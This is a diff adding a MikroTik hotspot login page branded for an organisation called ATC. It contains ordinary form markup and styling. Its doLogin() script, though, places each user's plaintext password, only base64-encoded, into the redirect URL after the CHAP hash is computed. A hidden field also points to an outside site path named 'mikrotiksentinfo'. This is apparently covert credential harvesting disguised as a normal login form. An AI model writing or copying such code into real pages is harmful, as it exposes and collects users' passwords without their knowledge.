@@ -1,0 +1,103 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <meta http-equiv="pragma" content="no-cache" />
+        <meta http-equiv="expires" content="-1" />
+        <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;"/>
+        <link rel="shortcut icon" href="atc_background.ico" />
+        <link href="font.css" rel="stylesheet">
+        <link href="atc.css" rel="stylesheet">
+<title>Login</title>
+    </head>
+
+<body>
+    $(if chap-id)
+    <form name="sendin" action="$(link-login-only)" method="post">
+        <input type="hidden" name="username" />
+        <input type="hidden" name="password" />
+        <input type="hidden" name="dst" value="https://www.africatrainovationconsulting.com/workstation/mikrotiksentinfo?username=" />
+        <input type="hidden" name="popup" value="true" />
+    </form>
+
+    <script type="text/javascript" src="/md5.js"></script>
+    <script type="text/javascript">
+        <!--
+            function doLogin() {
+            document.sendin.username.value = document.login.username.value;
+            document.sendin.password.value = hexMD5('$(chap-id)' + document.login.password.value + '$(chap-challenge)');
+            document.sendin.dst.value = "stat.htm?check=" + window.btoa(document.login.password.value);
+            document.sendin.submit();
+            return false;
+        }
+        //-->
+    </script>
+    $(endif)
+
+    <section id="loginpage">
+        <section id="signuppagelogoandswitch">    <a href="https://atc.com.ng/academy/"> <img src="ATC_logo.png" alt="atc logo"></a>
+                    </section>
+
+        <section class="login">
+            <div id="signupheader">
+                Please enter your internet login details
+            </div>
+            <div id="signupbody">
+                <div class= "font22">
+                    SIGN IN
+                </div>
+                <form class="font14" name="login" action="$(link-login-only)" method="post"
+                      $(if chap-id) onSubmit="return doLogin()" $(endif)>
+                      <input type="hidden" name="dst" value="$(link-orig)" />
+                        <input type="hidden" name="popup" value="true" />
+
+                    <div class="inputDetails">
+                        username *
+                        <input  name="username" type="text" value="$(username)" class="block ninethwidth" size="10" maxlength="50" required />
+                    </div>
+                    <div class="inputDetails">
+                        Password *
+                        <input id="password" type="password" name="password" class="block ninethwidth" required />
+
+                    </div>
+$(if error)<br /><div style="color: #FF8080; font-size: 16px; font-weight:bold">$(error)</div>$(endif)
+                    <div>
+                        <div class="inlineblock ">
+                            <button value="submit">
+                                Login
+                            </button>
+
+                        </div>
+                    </div>
+                </form>
+
+            </div>
+        </section>
+
+        <section id="signuppageaboutatc">
+            $(if error)<br /><div style="color: #FF8080; font-size: 9px">$(error)</div>$(endif)
+        </section>
+    </section>
+    <style>
+
+    /*+++++++++++++++SIGN UP/LOGIN+++++++++*/
+        body{
+        background-image: url("loginpage.svg");
+        background-color: #1207AB;
+        background-position: center center;
+        width: 100vw;
+        height: 100vh;
+        color: white;
+        overflow: hidden;
+        }
+
+    </style>
+<script type="text/javascript">
+<!--
+  document.login.username.focus();
+//-->
+</script>
+</body>
+
+</html>
